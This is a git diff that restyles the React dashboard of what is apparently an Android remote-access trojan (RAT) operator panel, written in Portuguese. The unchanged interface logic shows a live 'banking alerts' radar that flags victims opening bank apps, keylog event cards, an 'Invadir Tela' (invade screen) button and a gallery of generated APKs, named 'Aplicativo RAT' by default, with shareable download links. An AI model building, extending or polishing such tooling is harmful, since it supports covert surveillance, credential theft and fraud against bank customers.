-                className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-cyan-500 via-blue-600 to-sky-400 hover:from-cyan-400 hover:to-sky-300 text-white font-black font-mono text-xs transition-all hover:scale-105 active:scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)] border border-cyan-300 flex items-center gap-1 relative z-10"
+                className="px-3.5 py-1.5 rounded-md bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#f87171] hover:from-[#f87171] hover:to-[#fca5a5] text-[#10120a] font-black font-mono text-xs transition-all hover:scale-105 active:scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)] border border-[#4a4a56] flex items-center gap-1 relative z-10"
                 title="Ver Central de Apps Guardados"
               >
                 <span>Meus Apps</span>
-                <span className="text-sm">⚡</span>
+                <span className="text-sm"></span>
               </button>
             </div>
           </div>
           
-          {/* 🔔 BARRA SLIM DE ALERTAS BANCÁRIOS (CLEAN & ELEGANT) */}
+          {/*  BARRA SLIM DE ALERTAS BANCÁRIOS (CLEAN & ELEGANT) */}
           {(() => {
             const activeCount = alerts.filter(a => a.status === 'open').length;
             
             if (alerts.length === 0) {
               return (
-                <div className="mb-5 px-4 py-2.5 bg-[#1e0603]/80 border border-blue-500/20 rounded-xl flex items-center justify-between backdrop-blur-md">
+                <div className="mb-5 px-4 py-2.5 bg-[#1e0603]/80 border border-[#2a2a31]/20 rounded-md flex items-center justify-between backdrop-blur-md">
                   <div className="flex items-center space-x-2.5">
-                    <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span>
-                    <span className="text-xs font-bold text-blue-200/80 font-mono">Alertas Financeiros:</span>
-                    <span className="text-xs text-blue-300/50">Nenhum aplicativo bancário em execução no momento</span>
+                    <span className="w-2 h-2 rounded-full bg-[#ef4444] animate-pulse"></span>
+                    <span className="text-xs font-bold text-[#e8e8ea]/80 font-mono">Alertas Financeiros:</span>
+                    <span className="text-xs text-[#ef4444]/50">Nenhum aplicativo bancário em execução no momento</span>
                   </div>
-                  <span className="text-[10px] text-cyan-400 font-mono font-bold px-2 py-0.5 rounded bg-cyan-950/50 border border-cyan-500/20">
+                  <span className="text-[10px] text-[#ef4444] font-mono font-bold px-2 py-0.5 rounded bg-[#121214]/50 border border-[#2a2a31]/20">
                     SISTEMA ATIVO
                   </span>
                 </div>
@@ -938,13 +884,13 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             return (
               <div className="mb-5 space-y-2">
                 <div className="flex items-center justify-between px-1">
-                  <span className="text-xs font-bold text-cyan-300 font-mono flex items-center gap-2">
-                    <span className="w-2 h-2 rounded-full bg-red-400 animate-ping"></span>
+                  <span className="text-xs font-bold text-[#ef4444] font-mono flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-[#ef4444] animate-ping"></span>
                     Alertas Bancários Detectados ({alerts.length})
                   </span>
                   {activeCount > 0 && (
-                    <span className="text-[10px] font-bold text-red-400 font-mono uppercase bg-red-950/60 px-2.5 py-0.5 rounded-md border border-red-500/30">
-                      🚨 {activeCount} Banco(s) em foco
+                    <span className="text-[10px] font-bold text-[#ef4444] font-mono uppercase bg-[#121214]/60 px-2.5 py-0.5 rounded-md border border-[#2a2a31]/30">
+                       {activeCount} Banco(s) em foco
                     </span>
                   )}
                 </div>
@@ -957,27 +903,27 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                       <div
                         key={idx}
                         onClick={() => navigate(`/device/${item.deviceId}`)}
-                        className={`p-3 rounded-xl border transition-all cursor-pointer flex items-center justify-between ${
+                        className={`p-3 rounded-md border transition-all cursor-pointer flex items-center justify-between ${
                           isOpen
-                            ? 'bg-red-950/40 border-red-500/50 text-red-100 hover:border-red-400 shadow-md'
-                            : 'bg-blue-950/30 border-blue-500/20 text-blue-300/70 hover:border-cyan-500/40'
+                            ? 'bg-[#121214]/40 border-[#2a2a31]/50 text-[#e8e8ea] hover:border-[#3a3a44] shadow-md'
+                            : 'bg-[#121214]/30 border-[#2a2a31]/20 text-[#ef4444]/70 hover:border-[#2a2a31]/40'
                         }`}
                       >
                         <div className="flex items-center space-x-3 min-w-0">
                           <BankIcon pkg={item.bankPackage} iconB64={item.iconB64} name={item.bankName} size={32} />
                           <div className="min-w-0">
                             <span className="text-xs font-bold truncate block font-mono text-white">{item.bankName}</span>
-                            <span className="text-[10px] text-blue-300/50 truncate block font-mono">{item.deviceModel}</span>
+                            <span className="text-[10px] text-[#ef4444]/50 truncate block font-mono">{item.deviceModel}</span>
                           </div>
                         </div>
                         
                         <div className="flex items-center space-x-2 flex-shrink-0">
                           {isOpen ? (
-                            <span className="px-2.5 py-1 bg-red-600 hover:bg-red-500 text-white font-bold text-[10px] rounded-lg font-mono uppercase transition-all shadow">
+                            <span className="px-2.5 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white font-bold text-[10px] rounded-md font-mono uppercase transition-all shadow">
                               Acessar
                             </span>
                           ) : (
-                            <span className="text-[9px] font-mono text-blue-300/40 uppercase">
+                            <span className="text-[9px] font-mono text-[#ef4444]/40 uppercase">
                               Fechado
                             </span>
                           )}
@@ -1005,23 +951,23 @@ export default function Dashboard({ onLogout }: DashboardProps) {
 
         {/* HUD DE NOTIFICAÇÕES LATERAIS */}
         {isSidebarOpen && !isMobile && (
-          <div id="tour-banking-radar" className="w-80 border-l border-cyan-500/20 bg-[#190403]/40 backdrop-blur-md flex flex-col flex-shrink-0 text-slate-300 relative transition-all duration-300 ease-in-out shadow-[-10px_0_30px_rgba(0,0,0,0.5)]">
-            <div className="p-4 border-b border-cyan-500/20 flex items-center justify-between">
+          <div id="tour-banking-radar" className="w-80 border-l border-[#2a2a31]/20 bg-[#190403]/40 backdrop-blur-md flex flex-col flex-shrink-0 text-slate-300 relative transition-all duration-300 ease-in-out shadow-[-10px_0_30px_rgba(0,0,0,0.5)]">
+            <div className="p-4 border-b border-[#2a2a31]/20 flex items-center justify-between">
               <div className="flex items-center gap-2.5">
-                <Activity className="w-4 h-4 text-cyan-400 animate-pulse" />
-                <span className="text-xs font-black tracking-widest text-cyan-300 font-mono">RADAR DE ALERTAS</span>
+                <Activity className="w-4 h-4 text-[#ef4444] animate-pulse" />
+                <span className="text-xs font-black tracking-widest text-[#ef4444] font-mono">RADAR DE ALERTAS</span>
               </div>
               <div className="flex items-center gap-1.5">
                 <button
                   onClick={() => setSoundEnabled(!soundEnabled)}
-                  className={`p-1.5 rounded-lg transition-colors ${soundEnabled ? 'text-cyan-400 bg-cyan-500/10 hover:bg-cyan-500/20' : 'text-slate-500 hover:bg-slate-800'}`}
+                  className={`p-1.5 rounded-md transition-colors ${soundEnabled ? 'text-[#ef4444] bg-[#ef4444]/10 hover:bg-[#ef4444]/20' : 'text-[#8b8b94] hover:bg-[#24242a]'}`}
                   title={soundEnabled ? "Mudar para Silencioso" : "Ativar Som"}
                 >
                   {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
                 </button>
                 <button
                   onClick={() => setActivityLog([])}
-                  className="p-1.5 text-slate-400 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-colors"
+                  className="p-1.5 text-slate-400 hover:text-[#ef4444] hover:bg-[#ef4444]/10 rounded-md transition-colors"
                   title="Limpar Feed"
                 >
                   <Trash2 className="w-4 h-4" />
@@ -1031,12 +977,12 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             
             <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
               {activityLog.length === 0 ? (
-                <div className="h-full flex flex-col items-center justify-center text-center p-4 text-slate-500 space-y-3">
-                  <div className="p-3 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 text-cyan-400">
+                <div className="h-full flex flex-col items-center justify-center text-center p-4 text-[#8b8b94] space-y-3">
+                  <div className="p-3 rounded-md bg-[#ef4444]/10 border border-[#2a2a31]/20 text-[#ef4444]">
                     <Sparkles className="w-7 h-7 animate-pulse" />
                   </div>
                   <p className="text-xs font-bold text-slate-300">Sem atividades recentes</p>
-                  <p className="text-[11px] text-slate-500 leading-relaxed">Aparelhos conectados ou acessos a bancos aparecerão aqui em tempo real.</p>
+                  <p className="text-[11px] text-[#8b8b94] leading-relaxed">Aparelhos conectados ou acessos a bancos aparecerão aqui em tempo real.</p>
                 </div>
 
               ) : (
@@ -1048,16 +994,16 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                   const isOnline = event.type === 'device_online';
                   const isOffline = event.type === 'device_offline';
                   
-                  let cardStyle = "bg-[#2b0903]/40 border border-slate-800/80";
+                  let cardStyle = "bg-[#2b0903]/40 border border-[#24242a]/80";
                   
                   if (isOpen) {
-                    cardStyle = "bg-[#180a0f]/90 border-2 border-red-500/60 shadow-[0_0_15px_rgba(239,68,68,0.15)]";
+                    cardStyle = "bg-[#180a0f]/90 border-2 border-[#2a2a31]/60 shadow-[0_0_15px_rgba(239,68,68,0.15)]";
                   } else if (isNumeric) {
                     cardStyle = "bg-[#1c1809]/90 border-2 border-amber-400/80 shadow-[0_0_15px_rgba(245,158,11,0.2)]";
                   } else if (isKeylog) {
-                    cardStyle = "bg-[#280a03]/90 border border-cyan-500/50 shadow-[0_0_12px_rgba(239,68,68,0.15)]";
+                    cardStyle = "bg-[#280a03]/90 border border-[#2a2a31]/50 shadow-[0_0_12px_rgba(239,68,68,0.15)]";
                   } else if (isOnline) {
-                    cardStyle = "bg-[#280a03]/90 border border-cyan-500/40 shadow-[0_0_12px_rgba(239,68,68,0.1)]";
+                    cardStyle = "bg-[#280a03]/90 border border-[#2a2a31]/40 shadow-[0_0_12px_rgba(239,68,68,0.1)]";
                   } else if (isOffline) {
                     cardStyle = "bg-[#1a140c]/80 border border-amber-500/30";
                   }
@@ -1065,10 +1011,10 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                   return (
                     <div 
                       key={event.id}
-                      className={`p-3 rounded-xl transition-all duration-300 relative overflow-hidden ${cardStyle}`}
+                      className={`p-3 rounded-md transition-all duration-300 relative overflow-hidden ${cardStyle}`}
                     >
                       {isOpen && (
-                        <div className="absolute inset-0 bg-gradient-to-r from-red-500/5 to-transparent pointer-events-none"></div>
+                        <div className="absolute inset-0 bg-gradient-to-r from-[#ef4444]/5 to-transparent pointer-events-none"></div>
                       )}
                       
                       <div className="flex items-start gap-2.5 relative z-10">
@@ -1077,15 +1023,15 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                             <BankIcon pkg={event.bankPackage || ''} iconB64={event.iconB64} size={30} />
                           </div>
                         ) : (
-                          <div className="w-[30px] h-[30px] rounded-lg bg-slate-900 border border-slate-850 flex items-center justify-center flex-shrink-0 mt-0.5">
-                            <Smartphone className={`w-4 h-4 ${isOnline ? 'text-cyan-400 animate-bounce' : 'text-amber-500'}`} />
+                          <div className="w-[30px] h-[30px] rounded-md bg-[#121214] border border-slate-850 flex items-center justify-center flex-shrink-0 mt-0.5">
+                            <Smartphone className={`w-4 h-4 ${isOnline ? 'text-[#ef4444] animate-bounce' : 'text-amber-500'}`} />
                           </div>
                         )}
                         
                         <div className="flex-1 min-w-0">
                           <div className="flex items-center justify-between gap-1">
-                            <span className="font-mono text-[9px] text-slate-500 font-bold uppercase truncate">{event.deviceModel}</span>
-                            <span className="text-[8px] text-slate-500 font-mono flex-shrink-0">{event.timestamp}</span>
+                            <span className="font-mono text-[9px] text-[#8b8b94] font-bold uppercase truncate">{event.deviceModel}</span>
+                            <span className="text-[8px] text-[#8b8b94] font-mono flex-shrink-0">{event.timestamp}</span>
                           </div>
                           <h4 className="text-[11px] font-black text-white mt-0.5 uppercase tracking-wide truncate">
                             {event.title}
@@ -1099,11 +1045,11 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                               onClick={() => navigate(`/device/${event.deviceId}`)}
                               className={`mt-2 w-full py-1 rounded text-[9px] font-black uppercase tracking-wider transition-all duration-200 ${
                                 isOpen 
-                                  ? 'bg-gradient-to-r from-red-600 to-orange-500 hover:from-red-500 hover:to-orange-400 text-white shadow-[0_0_8px_rgba(239,68,68,0.2)]'
-                                  : 'bg-slate-850 hover:bg-slate-800 text-slate-300'
+                                  ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] shadow-[0_0_8px_rgba(239,68,68,0.2)]'
+                                  : 'bg-slate-850 hover:bg-[#24242a] text-slate-300'
                               }`}
                             >
-                              {isOpen ? '⚡ Invadir Tela' : '📡 Controlar'}
+                              {isOpen ? ' Invadir Tela' : ' Controlar'}
                             </button>
                           )}
                         </div>
@@ -1137,24 +1083,24 @@ export default function Dashboard({ onLogout }: DashboardProps) {
         onDelete={handleDeleteDevice}
       />
 
-      {/* 🚀 TOAST NOTIFICATIONS EM TEMPO REAL (Canto Superior Direito) */}
+      {/*  TOAST NOTIFICATIONS EM TEMPO REAL (Canto Superior Direito) */}
       <div className="fixed top-4 right-4 z-50 pointer-events-none space-y-3 max-w-sm w-full">
         {toasts.map((t) => {
           const isOpen = t.type === 'open';
           return (
             <div
               key={t.id}
-              className={`pointer-events-auto p-4 rounded-xl shadow-[0_10px_30px_rgba(0,0,0,0.5)] border backdrop-blur-xl flex items-center space-x-3.5 transition-all transform duration-300 animate-pulse-once ${
+              className={`pointer-events-auto p-4 rounded-md shadow-[0_10px_30px_rgba(0,0,0,0.5)] border backdrop-blur-xl flex items-center space-x-3.5 transition-all transform duration-300 animate-pulse-once ${
                 isOpen 
-                  ? 'bg-red-950/80 border-red-500/50 shadow-[0_0_20px_rgba(239,68,68,0.2)]' 
-                  : 'bg-slate-900/90 border-slate-700/50'
+                  ? 'bg-[#121214]/80 border-[#2a2a31]/50 shadow-[0_0_20px_rgba(239,68,68,0.2)]' 
+                  : 'bg-[#121214]/90 border-[#2a2a31]/50'
               }`}
             >
               <div className="flex-shrink-0">
                 <BankIcon pkg={t.bankPkg} iconB64={t.iconB64} size={38} />
               </div>
               <div className="flex-1 min-w-0">
-                <h4 className={`text-[10px] font-black uppercase tracking-widest ${isOpen ? 'text-red-400' : 'text-slate-400'}`}>
+                <h4 className={`text-[10px] font-black uppercase tracking-widest ${isOpen ? 'text-[#ef4444]' : 'text-slate-400'}`}>
                   {t.title}
                 </h4>
                 <p className="text-xs text-white font-bold mt-0.5">
@@ -1166,11 +1112,11 @@ export default function Dashboard({ onLogout }: DashboardProps) {
         })}
       </div>
 
-      {/* 📱 MODAL DE APKS GERADOS (MEUS APPS FUTURISTA & MODERNO) */}
+      {/*  MODAL DE APKS GERADOS (MEUS APPS FUTURISTA & MODERNO) */}
       {showMyAppsModal && (
         <div className="fixed inset-0 bg-black/85 flex items-center justify-center z-50 p-4 backdrop-blur-md animate-fade-in" onClick={() => setShowMyAppsModal(false)}>
           <div 
-            className="bg-gradient-to-b from-[#2b0803] via-[#1f0603] to-[#140303] border border-cyan-500/40 rounded-3xl max-w-4xl w-full p-6 shadow-[0_0_60px_rgba(239,68,68,0.25)] backdrop-blur-2xl relative max-h-[85vh] flex flex-col overflow-hidden animate-scale-up select-none"
+            className="bg-gradient-to-b from-[#2b0803] via-[#1f0603] to-[#0a0a0b] border border-[#2a2a31]/40 rounded-3xl max-w-4xl w-full p-6 shadow-[0_0_60px_rgba(239,68,68,0.25)] backdrop-blur-2xl relative max-h-[85vh] flex flex-col overflow-hidden animate-scale-up select-none"
             onClick={(e) => e.stopPropagation()}
           >
             {/* Blueprint Grid Background Accent */}
@@ -1178,20 +1124,20 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             
             <button 
               onClick={() => setShowMyAppsModal(false)}
-              className="absolute top-5 right-5 p-2 text-slate-400 hover:text-white bg-slate-900/80 hover:bg-red-500/80 rounded-xl transition-all border border-slate-800 z-20 cursor-pointer"
+              className="absolute top-5 right-5 p-2 text-slate-400 hover:text-white bg-[#121214]/80 hover:bg-[#ef4444]/80 rounded-md transition-all border border-[#24242a] z-20 cursor-pointer"
             >
               <X className="w-5 h-5" />
             </button>
 
-            <div className="relative z-10 flex items-center justify-between border-b border-cyan-500/20 pb-4 mb-4">
+            <div className="relative z-10 flex items-center justify-between border-b border-[#2a2a31]/20 pb-4 mb-4">
               <div className="flex items-center space-x-3">
-                <div className="p-3 bg-gradient-to-br from-cyan-500/20 to-blue-600/20 rounded-2xl border border-cyan-400/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
-                  <Smartphone className="w-6 h-6 text-cyan-300 animate-pulse" />
+                <div className="p-3 bg-gradient-to-br from-[#ef4444]/20 to-[#ef4444]/20 rounded-md border border-[#3a3a44]/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
+                  <Smartphone className="w-6 h-6 text-[#ef4444] animate-pulse" />
                 </div>
                 <div>
                   <h3 className="text-base font-black uppercase text-white tracking-widest font-mono flex items-center gap-2">
-                    📱 MEUS APLICATIVOS GERADOS
-                    <span className="px-2 py-0.5 bg-cyan-500/20 text-cyan-300 text-[10px] rounded-full border border-cyan-400/30">
+                     MEUS APLICATIVOS GERADOS
+                    <span className="px-2 py-0.5 bg-[#ef4444]/20 text-[#ef4444] text-[10px] rounded-full border border-[#3a3a44]/30">
                       {builds.length} APKs
                     </span>
                   </h3>
@@ -1204,7 +1150,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
               <button
                 type="button"
                 onClick={loadBuilds}
-                className="mr-12 px-3.5 py-1.5 bg-gradient-to-r from-cyan-600/30 to-blue-600/30 hover:from-cyan-500/40 hover:to-blue-500/40 border border-cyan-400/40 rounded-xl text-xs font-black uppercase text-cyan-200 transition-all shadow-[0_0_12px_rgba(239,68,68,0.2)] flex items-center gap-1.5 cursor-pointer font-mono"
+                className="mr-12 px-3.5 py-1.5 bg-gradient-to-r from-[#ef4444]/30 to-[#ef4444]/30 hover:from-[#ef4444]/40 hover:to-[#ef4444]/40 border border-[#3a3a44]/40 rounded-md text-xs font-black uppercase text-[#e8e8ea] transition-all shadow-[0_0_12px_rgba(239,68,68,0.2)] flex items-center gap-1.5 cursor-pointer font-mono"
               >
                 <RefreshCw className={`w-3.5 h-3.5 ${buildsLoading ? 'animate-spin' : ''}`} />
                 Atualizar
@@ -1214,14 +1160,14 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             <div className="relative z-10 flex-1 overflow-y-auto pr-1">
               {buildsLoading && builds.length === 0 ? (
                 <div className="py-20 flex flex-col items-center justify-center text-center space-y-3">
-                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-400 shadow-[0_0_15px_rgba(239,68,68,0.5)]"></div>
-                  <span className="text-xs text-cyan-300 font-mono">Carregando compilações de APKs...</span>
+                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#3a3a44] shadow-[0_0_15px_rgba(239,68,68,0.5)]"></div>
+                  <span className="text-xs text-[#ef4444] font-mono">Carregando compilações de APKs...</span>
                 </div>
               ) : builds.length === 0 ? (
-                <div className="py-16 text-center text-slate-400 text-xs bg-slate-950/60 rounded-2xl border border-slate-800/80 p-6">
-                  <div className="text-4xl mb-2">📦</div>
+                <div className="py-16 text-center text-slate-400 text-xs bg-slate-950/60 rounded-md border border-[#24242a]/80 p-6">
+                  <div className="text-4xl mb-2"></div>
                   <p className="font-bold text-slate-300 text-sm">Nenhum aplicativo gerado ainda</p>
-                  <p className="text-xs text-slate-500 mt-1">Os APKs compilados no APK Studio aparecerão listados aqui com suporte a download direto.</p>
+                  <p className="text-xs text-[#8b8b94] mt-1">Os APKs compilados no APK Studio aparecerão listados aqui com suporte a download direto.</p>
                 </div>
               ) : (
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pb-4">
@@ -1234,7 +1180,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                           hour: '2-digit',
                           minute: '2-digit'
                         })
-                      : '—';
+                      : '';
                     
                     const cleanAppName = build.appName ? build.appName.replace(/\s+/g, '-').toLowerCase() : 'app';
                     const fallbackFilename = `studio-user${build.ownerId || 1}-${cleanAppName}-${build.build_id}.apk`; 
@@ -1251,36 +1197,36 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                     return (
                       <div 
                         key={build.id || build.build_id}
-                        className="group bg-gradient-to-b from-[#2e0903]/90 to-[#1e0603]/90 hover:from-[#470e04]/90 hover:to-[#300903]/90 border border-cyan-500/25 hover:border-cyan-400/60 rounded-2xl p-4 transition-all duration-300 shadow-lg hover:shadow-[0_0_25px_rgba(239,68,68,0.25)] relative overflow-hidden flex flex-col justify-between"
+                        className="group bg-gradient-to-b from-[#2e0903]/90 to-[#1e0603]/90 hover:from-[#470e04]/90 hover:to-[#300903]/90 border border-[#2a2a31]/25 hover:border-[#3a3a44]/60 rounded-md p-4 transition-all duration-300 shadow-lg hover:shadow-[0_0_25px_rgba(239,68,68,0.25)] relative overflow-hidden flex flex-col justify-between"
                       >
-                        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-blue-500 via-cyan-400 to-teal-400 opacity-70 group-hover:opacity-100 transition-opacity"></div>
+                        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#ef4444] via-[#f87171] to-teal-400 opacity-70 group-hover:opacity-100 transition-opacity"></div>
                         
                         <div>
                           <div className="flex items-center justify-between mb-2">
-                            <span className="px-2.5 py-0.5 bg-cyan-950/80 text-cyan-300 border border-cyan-500/30 rounded-lg text-[9px] font-mono font-bold">
+                            <span className="px-2.5 py-0.5 bg-[#121214]/80 text-[#ef4444] border border-[#2a2a31]/30 rounded-md text-[9px] font-mono font-bold">
                               ID: {build.build_id}
                             </span>
                             <span className="text-[10px] text-slate-400 font-mono">
-                              📅 {dateFormatted}
+                               {dateFormatted}
                             </span>
                           </div>
                           
                           <div className="flex items-center space-x-3 my-2">
-                            <div className="p-2.5 bg-gradient-to-br from-blue-600 to-cyan-500 rounded-xl text-white shadow-[0_0_12px_rgba(239,68,68,0.4)]">
+                            <div className="p-2.5 bg-gradient-to-br from-[#ef4444] to-[#ef4444] rounded-md text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)]">
                               <Smartphone className="w-5 h-5" />
                             </div>
                             <div className="flex-1 min-w-0">
                               <h4 className="text-sm font-black text-white uppercase tracking-wide truncate">
                                 {build.appName || 'Aplicativo RAT'}
                               </h4>
-                              <p className="text-[10px] text-cyan-400/80 truncate font-mono mt-0.5">
-                                📦 {apkFilename}
+                              <p className="text-[10px] text-[#ef4444]/80 truncate font-mono mt-0.5">
+                                 {apkFilename}
                               </p>
                             </div>
                           </div>
                         </div>
                         
-                        <div className="flex items-center justify-between mt-3 pt-3 border-t border-cyan-500/15">
+                        <div className="flex items-center justify-between mt-3 pt-3 border-t border-[#2a2a31]/15">
                           <div className="flex items-center space-x-2">
                             <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 bg-emerald-950/60 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                               <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
@@ -1295,9 +1241,9 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                             <button
                               onClick={() => {
                                 navigator.clipboard.writeText(fullDownloadUrl);
-                                alert('✅ Link de download copiado para a área de transferência!');
+                                alert(' Link de download copiado para a área de transferência!');
                               }}
-                              className="px-2 py-1.5 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded-xl text-[10px] font-bold transition-all border border-cyan-500/20 flex items-center gap-1"
+                              className="px-2 py-1.5 bg-[#24242a] hover:bg-[#2a2a31] text-[#ef4444] rounded-md text-[10px] font-bold transition-all border border-[#2a2a31]/20 flex items-center gap-1"
                               title="Copiar Link de Download"
                             >
                               <Copy className="w-3 h-3" />
@@ -1313,7 +1259,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                                   window.location.href = fullDownloadUrl;
                                 }
                               }}
-                              className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 cursor-pointer"
+                              className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-md text-xs font-black uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 cursor-pointer"
                             >
                               <Download className="w-3.5 h-3.5" />
                               Baixar APK
@@ -1329,41 +1275,41 @@ export default function Dashboard({ onLogout }: DashboardProps) {
           </div>
         </div>
       )}
-      {/* 👤 MODAL DE MEU PERFIL */}
+      {/*  MODAL DE MEU PERFIL */}
       {showProfileModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4 animate-fade-in" onClick={() => setShowProfileModal(false)}>
           <div 
-            className="bg-[#200703]/95 border border-blue-500/30 rounded-2xl max-w-md w-full p-6 shadow-[0_0_50px_rgba(220,38,38,0.15)] backdrop-blur-xl relative flex flex-col animate-scale-up"
+            className="bg-[#200703]/95 border border-[#2a2a31]/30 rounded-md max-w-md w-full p-6 shadow-[0_0_50px_rgba(239,68,68,0.15)] backdrop-blur-xl relative flex flex-col animate-scale-up"
             onClick={(e) => e.stopPropagation()}
           >
             <button 
               onClick={() => setShowProfileModal(false)}
-              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white hover:bg-slate-800/50 rounded-lg transition-colors z-20"
+              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white hover:bg-[#24242a]/50 rounded-md transition-colors z-20"
             >
               <X className="w-5 h-5" />
             </button>
-            <div className="flex items-center space-x-3 border-b border-blue-500/10 pb-4 mb-4">
-              <div className="p-2 bg-blue-500/10 rounded-lg border border-blue-500/20">
-                <User className="w-5 h-5 text-blue-400" />
+            <div className="flex items-center space-x-3 border-b border-[#2a2a31]/10 pb-4 mb-4">
+              <div className="p-2 bg-[#ef4444]/10 rounded-md border border-[#2a2a31]/20">
+                <User className="w-5 h-5 text-[#ef4444]" />
               </div>
               <div>
-                <h3 className="text-sm font-black uppercase text-blue-400 tracking-widest font-mono">
-                  👤 Configurações do Meu Perfil
+                <h3 className="text-sm font-black uppercase text-[#ef4444] tracking-widest font-mono">
+                   Configurações do Meu Perfil
                 </h3>
-                <p className="text-[10px] text-slate-500 mt-0.5">
+                <p className="text-[10px] text-[#8b8b94] mt-0.5">
                   Atualize suas credenciais de acesso ao painel
                 </p>
               </div>
             </div>
             <form onSubmit={handleSaveProfile} className="space-y-4">
               {profileError && (
-                <div className="p-3 bg-red-500/10 border border-red-500/20 text-red-400 text-xs rounded-lg font-medium">
-                  ⚠️ {profileError}
+                <div className="p-3 bg-[#ef4444]/10 border border-[#2a2a31]/20 text-[#ef4444] text-xs rounded-md font-medium">
+                  ️ {profileError}
                 </div>
               )}
               {profileSuccess && (
-                <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-lg font-medium">
-                  ✅ {profileSuccess}
+                <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-md font-medium">
+                   {profileSuccess}
                 </div>
               )}
               <div>
@@ -1373,7 +1319,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                   value={profileUsername} 
                   onChange={(e) => setProfileUsername(e.target.value)} 
                   required
-                  className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none"
+                  className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none"
                 />
               </div>
               <div>
@@ -1383,11 +1329,11 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                   value={profileEmail} 
                   onChange={(e) => setProfileEmail(e.target.value)} 
                   required
-                  className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none"
+                  className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none"
                 />
               </div>
-              <div className="border-t border-slate-900/80 pt-3">
-                <p className="text-[10px] text-slate-500 font-medium mb-3">Deseja alterar a senha? Deixe em branco se não quiser mudar.</p>
+              <div className="border-t border-[#121214]/80 pt-3">
+                <p className="text-[10px] text-[#8b8b94] font-medium mb-3">Deseja alterar a senha? Deixe em branco se não quiser mudar.</p>
                 
                 <div className="space-y-3">
                   <div>
@@ -1396,8 +1342,8 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                       type="password" 
                       value={profilePassword} 
                       onChange={(e) => setProfilePassword(e.target.value)} 
-                      placeholder="••••••••"
-                      className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-slate-800"
+                      placeholder=""
+                      className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-[#24242a]"
                     />
                   </div>
                   <div>
@@ -1406,8 +1352,8 @@ export default function Dashboard({ onLogout }: DashboardProps) {
                       type="password" 
                       value={profileConfirmPassword} 
                       onChange={(e) => setProfileConfirmPassword(e.target.value)} 
-                      placeholder="••••••••"
-                      className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-slate-800"
+                      placeholder=""
